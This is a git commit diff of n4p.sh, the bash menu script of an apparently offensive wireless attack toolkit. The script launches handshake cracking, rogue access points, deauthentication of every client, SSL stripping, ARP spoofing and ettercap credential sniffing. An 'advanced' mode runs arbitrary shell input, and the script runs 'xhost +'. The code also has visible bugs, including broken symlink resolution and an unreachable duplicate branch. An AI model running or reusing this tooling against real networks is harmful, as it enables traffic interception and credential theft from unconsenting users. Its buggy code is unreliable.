5bec63df9f241f344185b17560694b0613261bfc
Chris Scott <cyb3r-assassin@cyberpunk.me>
2015-02-26 20:28:25 -0600

    2.0

--- n4p.sh
+++ n4p.sh
@@ -1,3 +1,4 @@
+
 #!/bin/bash
 if [[ $(id -u) != 0 ]]; then # Verify we are not root
 	xhost +
@@ -11,13 +12,18 @@ SOURCE="${BASH_SOURCE[0]}"
 while [[ -h "$SOURCE" ]]; do # resolve $SOURCE until the file is no longer a symlink
     DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
     SOURCE="$(readlink "$SOURCE")"
-    [[ $SOURCE != /* ]] && SOURCE="${DIR}/$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it's relativeness to the path where the symlink file was located
+    [[ $SOURCE != /* ]] && SOURCE="$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it's relativeness to the path where the symlink file was located
 done
 DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
 DIR_CONF=/etc/n4p
 DIR_LOGO=/usr/share/n4p
 
-get_name()
+get_RCstatus() # What is the status from OpenRC of the service
+{
+    STATUS=$(/etc/init.d/$1 status | sed 's/* status: //g' | cut -d ' ' -f 2)
+}
+
+get_name() #Parse the values in the config file
 {
     USE=$(grep $1 ${DIR_CONF}/n4p.conf | awk -F= '{print $2}')
 }
@@ -32,102 +38,195 @@ TXT_RST=$(tput sgr0)             # Reset
 EYES=$(tput setaf 6)
 AP_GATEWAY=$(grep routers ${DIR_CONF}/dhcpd.conf | awk -Frouters '{print $2}' | cut -d ';' -f 1 | cut -d ' ' -f 2)
 get_name "IFACE1="; IFACE1=$USE
+get_name "OS="; OS=$USE
+get_name "NetworkManager="; NetworkManager=$USE
+get_name "OS="; OS=$USE
+get_name "INTERFACE="; INTERFACE=$USE
 MON="${IFACE1}mon"
-
+FAILSAFE="th8934pjghwt74ygp"
 echo "${BLD_TEA}$(cat ${DIR_LOGO}/opening.logo)${TXT_RST}"; sleep 1
 
 sessionfolder=/tmp/n4p # Set our tmp working configuration directory and then build config files
 [ ! -d "$sessionfolder" ] && mkdir "$sessionfolder"; mkdir -p "$sessionfolder" "${sessionfolder}/logs"
 
+if [[ $NetworkManager == "True" ]]; then #n4p cant operate airmon and such with network manager hogging everything. We must kill it.
+    if [[ $OS == "Pentoo" ]]; then
+        get_RCstatus "NetworkManager"
+        [[ $STATUS == 'started' ]] && /etc/init.d/NetworkManager stop
+    else
+        sudo service network-manager stop
+    fi
+fi
+
+cut_choice() #This function parses the input commands in advanced mode for use with pre defined custom interactions
+{
+    CHOICE=${CHOICE:4:${#CHOICE}}
+}
+
 menu()
 {
+    if [[ $INTERFACE == "Basic" ]]; then
+      echo -e "\n"
+      echo -e "${BLD_WHT}
+                /\#/\         '\\-//\`       |.===. '   
+                /(${TXT_RST}${EYES}o o${TXT_RST}${BLD_WHT})\        (${EYES}o o${TXT_RST}${BLD_WHT})        ${TXT_RST}${PUR}{}${TXT_RST}${EYES}o o${TXT_RST}${PUR}{}${TXT_RST}${BLD_WHT}  
+      +======ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo======+
+      | ${TXT_RST}${BLD_TEA}1${TXT_RST}${BLD_WHT})  Set devices for use and attack                  |
+      | ${TXT_RST}${BLD_TEA}2${TXT_RST}${BLD_WHT})  Perform wifi radius recon                       |
+      | ${TXT_RST}${BLD_TEA}3${TXT_RST}${BLD_WHT})  Airodump-ng .cap file or Wash network           |
+      | ${TXT_RST}${BLD_TEA}4${TXT_RST}${BLD_WHT})  Crack .cap and hashes                           |
+      | ${TXT_RST}${BLD_TEA}5${TXT_RST}${BLD_WHT})  Attack or Launch AP                             |
+      | ${TXT_RST}${BLD_TEA}6${TXT_RST}${BLD_WHT})  Enumerate the Firewall ${TXT_RST}${BLD_TEA}(Run this option last)${TXT_RST}${BLD_WHT}   |
+      | ${TXT_RST}${BLD_TEA}7${TXT_RST}${BLD_WHT})  Kick everyone                                   |
+      | ${TXT_RST}${BLD_TEA}8${TXT_RST}${BLD_WHT})  Start Ettercap Sniffer                          |
+      | ${TXT_RST}${BLD_TEA}0${TXT_RST}${BLD_WHT})  EXIT                                            |
+      +=====================================================+${TXT_RST}"
+      read -p "Option: " CHOICE
+    else
+        echo ""
+        read -p "${BLD_WHT}N4P${TXT_RST}${BLD_TEA}$ ${TXT_RST}" CHOICE
+    fi
 
-    echo -e "\n"
-    echo -e "${BLD_WHT}
-               /\#/\         '\\-//\`       |.===. '   
-              /(${TXT_RST}${EYES}o o${TXT_RST}${BLD_WHT})\        (${EYES}o o${TXT_RST}${BLD_WHT})        ${TXT_RST}${PUR}{}${TXT_RST}${EYES}o o${TXT_RST}${PUR}{}${TXT_RST}${BLD_WHT}  
-    +======ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo======+
-    | ${TXT_RST}${BLD_TEA}1${TXT_RST}${BLD_WHT})  Set devices for use and attack                  |
-    | ${TXT_RST}${BLD_TEA}2${TXT_RST}${BLD_WHT})  Perform wifi radius recon                       |
-    | ${TXT_RST}${BLD_TEA}3${TXT_RST}${BLD_WHT})  Airodump-ng .cap file or Wash network           |
-    | ${TXT_RST}${BLD_TEA}4${TXT_RST}${BLD_WHT})  Crack .cap and hashes                           |
-    | ${TXT_RST}${BLD_TEA}5${TXT_RST}${BLD_WHT})  Launch AP or Attack                             |
-    | ${TXT_RST}${BLD_TEA}6${TXT_RST}${BLD_WHT})  Enumerate the Firewall ${TXT_RST}${BLD_TEA}(Run this option last)${TXT_RST}${BLD_WHT}   |
-    | ${TXT_RST}${BLD_TEA}7${TXT_RST}${BLD_WHT})  Kick everyone                                   |
-    | ${TXT_RST}${BLD_TEA}8${TXT_RST}${BLD_WHT})  Start Ettercap Sniffer                          |
-    | ${TXT_RST}${BLD_TEA}9${TXT_RST}${BLD_WHT})  ARP the Network                                 |
-    | ${TXT_RST}${BLD_TEA}0${TXT_RST}${BLD_WHT})  EXIT                                            |
-    +=====================================================+${TXT_RST}"
-    read -p "Option: " choice
-    if [[ $choice == 0 ]]; then
-        killemAll
-    elif [[ $choice == 1 ]]; then
+    if [[ $CHOICE == "advanced" || $CHOICE == "Advanced" ]]; then #Find out what the user wants then recall the menu arrangement based on this.
+        INTERFACE="Advanced"
+        menu
+    elif [[ $CHOICE == "simple" || $CHOICE == "basic" || $CHOICE == "Simple" || $CHOICE == "Basic" ]]; then
+        INTERFACE="Basic"
+        menu
+    #The current defined menu options are compleated now we look for user actions
+    elif [[ $CHOICE == 0 || $CHOICE == "quit" || $CHOICE == "exit" ]]; then
+        killemAll $FAILSAFE
+    elif [[ $CHOICE == "?" || $CHOICE == "help" || $CHOICE == "Help" ]]; then
+        echo "Help! Commands and options are."
+        echo "list modules | show modules"
+        echo "use [ atom ]"
+        echo "show options"
+        echo "run"
+        echo "basic | simple"
+        echo "advanced"
+        echo "Any basic mode menu option number. 0-9"
+        echo "Any bash command"
+    elif [[ $CHOICE == 1 ]]; then
         sudo nano /etc/n4p/n4p.conf
-    elif [[ $choice == 2 ]]; then
+    elif [[ $CHOICE == 2 ]]; then
         get_name "IFACE1="; IFACE1=$USE
-        sudo xterm -bg black -fg blue -T "Recon" -geometry 90x20 -e ${DIR}/./recon.sh $IFACE1 recon &>/dev/null &
-    elif [[ $choice == 3 ]]; then
+        sudo xterm -bg black -fg blue -T "Recon" -geometry 90x20 -e ./modules/recon.sh &>/dev/null &
+    elif [[ $CHOICE == 3 ]]; then
         get_name "IFACE1="; IFACE1=$USE
         get_name "ATTACK="; ATTACK=$USE
-        if [[ $ATTACK == 'WPS' ]]; then
-            sudo xterm -bg black -fg blue -T "Wash" -geometry 90x20 -e ${DIR}/./recon.sh $IFACE1 wash &>/dev/null &
+        if [[ $ATTACK == "WPS" ]]; then
+            sudo xterm -bg black -fg blue -T "Wash" -geometry 90x20 -e ./modules/wash.sh &>/dev/null &
         else
-            sudo xterm -bg black -fg blue -T "Dump cap" -geometry 90x20 -e ${DIR}/./recon.sh $IFACE1 dump &>/dev/null &
+            sudo xterm -bg black -fg blue -T "Dump cap" -geometry 90x20 -e ./modules/recon.sh &>/dev/null &
         fi
-    elif [[ $choice == 4 ]]; then
+    elif [[ $CHOICE == 4 ]]; then
         get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
         get_name "WORD_LIST="; WORD_LIST=$USE
         get_name "CRACK="; CRACK=$USE
         if [[ $CRACK == "Aircrack-ng" ]]; then
-            sudo xterm -hold -bg black -fg blue -T "Cracking" -geometry 90x20 -e aircrack-ng ${sessionfolder}/${VICTIM_BSSID}-01.cap -w $WORD_LIST &>/dev/null &
-        else
+            sudo xterm -hold -bg black -fg blue -T "Cracking" -geometry 90x20 -e ./modules/cracking.sh &>/dev/null &
+        else 
+        #!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+        #!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+        # We need to update this to account for hashcat and wep!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
             echo "CRACK= configuration error, check config file"
         fi
-    elif [[ $choice == 5 ]]; then
+    elif [[ $CHOICE == 5 ]]; then
         get_name "ATTACK="; ATTACK=$USE
-        if [[ $ATTACK != 'WPS' ]]; then
-            sudo xterm -bg black -fg blue -T "Airbase" -geometry 90x20 -e ${DIR}/./n4p_main.sh &>/dev/null &
+        if [[ $ATTACK == "Handshake" || $ATTACK == "Karma" || -z $ATTACK ]]; then
+            sudo xterm -bg black -fg blue -T "Airbase" -geometry 90x20 -e ./modules/airbase.sh &>/dev/null &
         elif [[ $ATTACK == "WPS" ]]; then
-            sudo xterm -bg black -fg blue -T "Bully" -geometry 90x20 -e ${DIR}/./recon.sh $IFACE1 bully &>/dev/null &
+            sudo xterm -bg black -fg blue -T "Bully" -geometry 90x20 -e ./modules/recon.sh &>/dev/null &
+        elif [[ $ATTACK == "SslStrip" ]]; then
+        #   startairbase; fbridge; dhcp ######################################################################### We often use these function to set adapters here for dev reference
+            echo -e "SSL Strip Log File\n" > ${sessionfolder}/ssl.log
+            sudo xterm -T "SSL Strip" -geometry 50x5 -e sslstrip -p -k -f lock.ico -w ${sessionfolder}/ssl.log &>/dev/null &
+        elif [[ $ATTACK == "WPE" ]]; then
+            sudo xterm -bg black -fg blue -T "WPE" -geometry 90x20 -e ./modules/wpe.sh  &>/dev/null &
+        elif [[ $ATTACK == "SslStrip" ]]; then
+            get_name "IFACE1="; IFACE1=$USE
+            get_name "ARP_VICTIM="; ARP_VICTIM=$USE
+            sudo xterm -T "Arpspoof $IFACE1 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i $IFACE1 $ARP_VICTIM &>/dev/null &
         fi
-    elif [[ $choice == 6 ]]; then
-    	sudo xterm -bg black -fg blue -T "iptables" -geometry 90x20 -e ${DIR}/./n4p_iptables.sh &>/dev/null &
-    elif [[ $choice == 7 ]]; then
+    elif [[ $CHOICE == 6 ]]; then
+        sudo xterm -bg black -fg blue -T "iptables" -geometry 90x20 -e ./modules/n4p_iptables.sh &>/dev/null &
+    elif [[ $CHOICE == 7 ]]; then
         get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
         get_name "STATION="; STATION=$USE
         get_name "IFACE1="; IFACE1=$USE
         MON="${IFACE1}mon"
         sudo xterm -bg black -fg blue -T "Aireplay" -geometry 90x20 -e aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION ${IFACE1}mon &>/dev/null &
-    elif [[ $choice == 8 ]]; then
+    elif [[ $CHOICE == 8 ]]; then
         get_name "BRIDGE_NAME="; BR_NAME=$USE
         get_name "AP="; AP_NAME=$USE
         get_name "BRIDGED="; BRIDGED=$USE
         [[ ! -f ${sessionfolder}/recovered_passwords.pcap ]] && sudo touch ${sessionfolder}/recovered_passwords.pcap
         get_name "ETTERCAP_OPTIONS="; ETTERCAP_OPTIONS=$USE
         if [[ $BRIDGED == "True" ]]; then
-          sudo xterm -T "ettercap $BR_NAME" -geometry 90x20 -e ettercap ${ETTERCAP_OPTIONS} -i ${BR_NAME} &>/dev/null &
+            sudo xterm -T "ettercap $BR_NAME" -geometry 90x20 -e ettercap ${ETTERCAP_OPTIONS} -i ${BR_NAME} &>/dev/null &
         elif [[ $AP_NAME == "AIRBASE" ]]; then
-           sudo xterm -T "ettercap at0" -geometry 90x20 -e ettercap -i at0 ${ETTERCAP_OPTIONS} -w ${sessionfolder}/recovered_passwords.pcap &>/dev/null &
+            sudo xterm -T "ettercap at0" -geometry 90x20 -e ettercap -i at0 ${ETTERCAP_OPTIONS} -w ${sessionfolder}/recovered_passwords.pcap &>/dev/null &
         #elif [[ $AP_NAME == "HOSTAPD" ]]; then
         #   sudo xterm -T "ettercap $IFACE1" -geometry 90x20 -e ettercap $ETTERCAP_OPTIONS -i $IFACE1 -w ${sessionfolder}/recovered_passwords.pcap &>/dev/null &
         fi
-    elif [[ $choice == 9 ]]; then
-        get_name "IFACE1="; IFACE1=$USE
-        get_name "ARP_VICTIM="; ARP_VICTIM=$USE
-        sudo xterm -T "Arpspoof $IFACE1 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i $IFACE1 $ARP_VICTIM &>/dev/null &
     else
-    	echo "Invald Option"
-    	menu
+        ###########################################################################################################################
+        # This section is all about advanced mode. We allow the user to run custom modules and interact with the shell directly
+        ###########################################################################################################################
+        if [[ $INTERFACE == "Advanced" ]]; then
+            if [[ $CHOICE == "use"* ]]; then
+                cut_choice $CHOICE
+                echo "use=$CHOICE"
+                if [[ ! -f modules/$CHOICE ]]; then
+                    echo "${BLD_TEA}You seem to be confused.${TXT_RST}"
+                else
+                    run=$CHOICE
+                fi
+            elif [[ $CHOICE == "run" ]]; then
+                if [[ -n $CHOICE ]]; then # Check if the CHOICE is empty before trying to exacute
+                    sudo xterm -hold -bg black -fg blue -T "N4P Advanced runtime" -geometry 65x15 -e ./modules/$run &>/dev/null &
+                    #sudo ./modules/$CHOICE
+                else
+                    echo "${BLD_TEA}Nothing to do!${TXT_RST}"
+                fi
+            elif [[ $CHOICE == "show options" ]]; then
+              if [[ -n $run ]]; then # Check if the CHOICE is empty before trying to exacute
+                  cat modules/$run | grep get_name\ \" | cut -d '"' -f 2
+              else
+                  echo "${BLD_TEA}Nothing to do!${TXT_RST}"
+              fi
+            elif [[ $CHOICE == "list modules" || $CHOICE == "show modules" ]]; then
+                printf %s "$(ls modules/)"
+            #elif [[ $CHOICE = set* ]]; then
+            #      AP=tester
+            #      cut_CHOICE $CHOICE
+            #      var=$(echo "$CHOICE" | cut -d ' ' -f 1)
+            #      str=$(echo "$CHOICE" | cut -d ' ' -f 2)
+            #      printf $var=$str
+            #      echo $AP
+            else
+                printf %s "$($CHOICE)"
+                echo -e "\n\n"
+                menu
+            fi
+        else
+            echo "${BLD_TEA}I'm confused.${TXT_RST}"
+        fi
     fi
-    clear; menu
+    menu
 }
 
 killemAll()
 {
     echo ""
-    xhost -
-    echo "${BLD_TEA}$(cat ${DIR_LOGO}/zed.logo)${TXT_RST}"
-    exit 0
+    if [[ $1 != $FAILSAFE ]]; then
+        clear
+        menu
+    else
+        xhost -
+        echo "${BLD_TEA}$(cat ${DIR_LOGO}/zed.logo)${TXT_RST}"
+        exit 0
+    fi
 }
 
 trap killemAll INT HUP;
